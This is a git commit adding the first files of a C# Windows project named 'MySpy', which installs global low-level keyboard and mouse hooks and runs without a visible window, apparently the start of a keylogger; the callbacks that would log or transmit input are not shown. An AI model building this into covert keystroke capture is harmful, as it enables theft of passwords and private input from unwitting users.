2074baa8344e7265eb1da1a51a8cae889b3ff6b7
vominhtri231 <vominhtri231@gmail.com>
2018-05-27 00:03:54 +0700

    first commit

---
+++ HookApp.cs
@@ -0,0 +1,49 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using HookDLL;
+
+namespace MySpy
+{
+    class HookApp
+    {
+        private const int WH_MOUSE_LL = 14;
+        private const int WH_KEYBOARD_LL = 13;
+        public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        public HookApp()
+        {
+            HookProceduces hookProceduces = new HookProceduces();
+            SetHook(WH_MOUSE_LL, hookProceduces.MouseHookCallback);
+            SetHook(WH_KEYBOARD_LL, hookProceduces.KeyHookCallback);
+        }
+
+        private static IntPtr SetHook(int idHook,HookProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            {
+                using (ProcessModule curModule = curProcess.MainModule)
+                {
+                    return SetWindowsHookEx(idHook, proc,GetModuleHandle(curModule.ModuleName), 0);
+                }
+            }
+            
+        }
+
+        private  IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            return IntPtr.Zero;
+        }
+
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,21 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace MySpy
+{
+    static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        
+        static void Main()
+        {
+            new HookApp();
+            Application.Run();
+        }
+    }
+}
